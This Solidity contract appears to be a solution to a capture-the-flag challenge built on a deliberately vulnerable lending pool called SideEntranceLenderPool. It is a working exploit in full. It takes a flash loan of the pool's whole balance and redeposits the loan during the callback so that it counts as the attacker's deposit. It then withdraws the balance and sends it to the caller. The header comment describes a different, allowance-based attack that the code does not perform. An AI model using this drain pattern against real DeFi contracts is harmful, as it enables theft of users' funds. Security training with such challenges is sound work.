// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// this contract will be executed on behalf of the lending pool, it will approve an allowance for the attacker EA
// thanks to this allowance which will be given during the flashloan function, the attacker will be able to spend
// the DVT tokens of the pool in a subsequent tx

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./SideEntranceLenderPool.sol";

contract attacker3 {

    using Address for address payable;

    constructor() {
    }

    function attack(address pool) external {
        SideEntranceLenderPool pool = SideEntranceLenderPool(pool);

        uint256 poolBal = address(pool).balance;

        pool.flashLoan(poolBal);

        pool.withdraw();

        payable(msg.sender).transfer(poolBal);
    }

    function execute() external payable {

        // the fucntion will be called by the flashloan pool (msg.sender address)
        SideEntranceLenderPool pool = SideEntranceLenderPool(msg.sender);

        pool.deposit{value: msg.value}();

    }
    
    // needed for pool.withdraw() to work
    receive() external payable {}

}